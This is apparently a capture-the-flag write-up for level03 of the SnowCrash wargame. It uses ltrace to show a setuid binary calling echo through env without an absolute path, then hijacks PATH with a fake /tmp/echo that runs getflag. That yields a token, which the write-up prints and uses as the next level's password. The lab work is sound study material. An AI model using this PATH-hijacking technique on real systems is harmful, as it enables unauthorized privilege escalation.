```
    level03@SnowCrash:~$ ls
    level03
```


```
    level03@SnowCrash:~$ ltrace ./level03 
    __libc_start_main(0x80484a4, 1, 0xbffff804, 0x8048510, 0x8048580 <unfinished ...>
    getegid()                                  = 2003
    geteuid()                                  = 2003
    setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
    setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
    system("/usr/bin/env echo Exploit me"Exploit me)
    <unfinished ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                     = 0
    +++ exited (status 0) +++
```

as we can see level03 script use a non absolute path to echo, so we can exploit that by adding our own echo to PATH variable where we can use getflag instead of echo
```
    ls -l /
```
we have write permission in tmp directory

```
    echo "/bin/getflag" > /tmp/echo
    chmod +x /tmp/echo
    export PATH=/tmp:$PATH
```
then we run our executable

```
    level03@SnowCrash:~$ ./level03 
    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

```
    su level04
    password: qi0maab88jeaj46qoumi7maus
```